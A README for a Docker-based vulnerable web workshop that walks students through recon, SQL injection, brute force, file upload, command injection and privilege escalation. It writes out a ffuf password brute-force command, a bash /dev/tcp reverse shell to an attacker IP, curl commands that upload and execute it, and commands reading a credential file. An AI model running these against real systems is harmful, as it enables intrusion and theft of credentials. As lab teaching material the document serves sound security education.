# Vulnerable Web Workshop

Welcome to the Vulnerable Web Workshop! This project is designed to help beginners learn about web vulnerabilities and how to exploit them in a controlled environment. The workshop will guide you through various steps, each focusing on different types of vulnerabilities commonly found in web applications.

---

## Prerequisites

Before starting, ensure you have the following installed on your machine:

| Tool | Version | Purpose |
|------|---------|---------|
| [Docker Desktop](https://www.docker.com/products/docker-desktop/) | Latest | Run the vulnerable web app containers |
| [Git](https://git-scm.com/) | Latest | Clone the repository |
| [Kali Linux](https://www.kali.org/) (VM or bare metal) | Latest | Attack machine with pre-installed tools |

### Kali Tools Used
- `nmap` — Port scanning & service detection
- `ffuf` — Web fuzzing & brute force login
- `curl` — HTTP requests
- `netcat (nc)` — Reverse shell listener
- `gobuster` — Directory enumeration

### Brute Force Login with ffuf
```bash
# Brute force password for a known username
ffuf -u http://<host-ip>:3010/api/login \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"FUZZ"}' \
  -w /usr/share/wordlists/rockyou.txt \
  -fc 401
```

> **Tip:** Use `-fc 401` to filter out failed login responses (401 Unauthorized) and only show successful ones.

---

## Quick Start (Deployment)

### Step 1: Clone the Repository
```bash
git clone <repository-url>
cd vulnerable-web-workshop
```

### Step 2: Start the Application with Docker
```bash
cd server
docker compose up -d
```

This will start:
- **Web App** — Vulnerable Next.js application on port `3010`
- **Ubuntu Target** — Vulnerable Linux server for privilege escalation

### Step 3: Verify Containers are Running
```bash
docker compose ps
```

You should see:
```
NAME                     STATUS    PORTS
server-web-1             Running   0.0.0.0:3010->3000/tcp
server-ubuntu-target-1   Running
```

### Step 4: Get the Host Machine IP
```bash
# macOS
ipconfig getifaddr en0

# Linux
hostname -I | awk '{print $1}'
```

> **Important:** Students on Kali will use this IP to access the web app at `http://<host-ip>:3010`

### Step 5: Verify Access from Kali
```bash
# From Kali
nmap -sV -p 3010 <host-ip>
curl http://<host-ip>:3010
```

---

## Network Architecture

```
┌─────────────────────────────────────────────────┐
│              Docker Network (workshop-net)        │
│                                                  │
│  ┌──────────────┐       ┌───────────────────┐   │
│  │   web        │       │  ubuntu-target    │   │
│  │  (Next.js)   │       │  (Priv Esc Lab)   │   │
│  │  Port: 3000  │       │                   │   │
│  └──────────────┘       └───────────────────┘   │
│                                                  │
└──────────────────────────────────────────────────┘
         │ Port 3010
         ▼
┌─────────────────┐         ┌─────────────────┐
│   Host Machine  │◄───────►│   Kali Linux    │
│  (Docker Host)  │  LAN    │  (Attacker)     │
└─────────────────┘         └─────────────────┘
```

---

## Workshop Steps

| Step | Topic | Target |
|------|-------|--------|
| 1 | Reconnaissance | Web App |
| 2 | SQL Injection | Web App (`/api/search`) |
| 3 | Broken Authentication | Web App (`/api/login`) |
| 4 | File Upload & RCE | Web App (`/api/upload`) |
| 5 | Command Injection | Web App (`/api/exec`) |
| 6 | Reverse Shell | Web App → Kali |
| 7 | Privilege Escalation | Ubuntu Target |

---

## Key Endpoints

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/` | GET | Landing page |
| `/login` | GET | Login page |
| `/search` | GET | Search page (SQL injection) |
| `/upload` | GET | File upload page |
| `/api/login` | POST | Authentication API (JSON) |
| `/api/search` | GET | Search API (SQL injection) |
| `/api/upload` | POST | File upload API |
| `/api/exec` | GET | Command execution API (`?cmd=`) |
| `/uploads/` | GET | View uploaded files |

---

## Reverse Shell Setup

### On Kali (listener):
```bash
nc -lvnp 4444
```

### Create `shell.sh`:
```bash
#!/bin/bash
bash -i >& /dev/tcp/<KALI-IP>/4444 0>&1
```

### Upload and trigger:
```bash
# Upload
curl -F "file=@shell.sh" http://<host-ip>:3010/api/upload

# Execute
curl "http://<host-ip>:3010/api/exec?cmd=bash%20/usr/src/app/public/uploads/shell.sh"
```

> **Note:** Kali must be reachable from the Docker container. If on the same LAN as the host machine, use Kali's LAN IP.

---

## Privilege Escalation (Ubuntu Target)

Access the ubuntu-target from the host:
```bash
docker exec -it server-ubuntu-target-1 bash
```

Or from within a reverse shell on the web container:
```bash
# Pivot to ubuntu-target (same Docker network)
curl http://ubuntu-target:3000
```

Key commands inside ubuntu-target:
```bash
whoami
sudo -l
find / -perm -4000 -exec ls -la {} \;
cat /opt/techcorp/.env
```

---

## Stopping the Lab

```bash
cd server
docker compose down
```

---

## Troubleshooting

| Problem | Solution |
|---------|----------|
| Can't access from Kali | Check host IP with `ipconfig getifaddr en0`, ensure same network |
| Port 3010 not open | Run `docker compose ps`, ensure web container is running |
| Reverse shell won't connect | Ensure Kali IP is reachable from container: `docker exec server-web-1 bash -c "echo test > /dev/tcp/<kali-ip>/4444"` |
| Container crashed | Run `docker compose logs web` to check errors |

---

## Learning Objectives

By the end of this workshop, you will have a better understanding of:

- Common web vulnerabilities and their exploitation
- Techniques for securing web applications against these vulnerabilities
- Practical experience using offensive security tools (nmap, ffuf, netcat, curl)
- How attackers chain vulnerabilities to gain full system access

---

## Important Notes

- This workshop is intended for **educational purposes only**. Do not use the knowledge gained here for malicious activities.
- Ensure you have permission to test any applications or systems outside of this workshop environment.
- All attacks should only be performed within this isolated Docker environment.

Happy learning and hacking!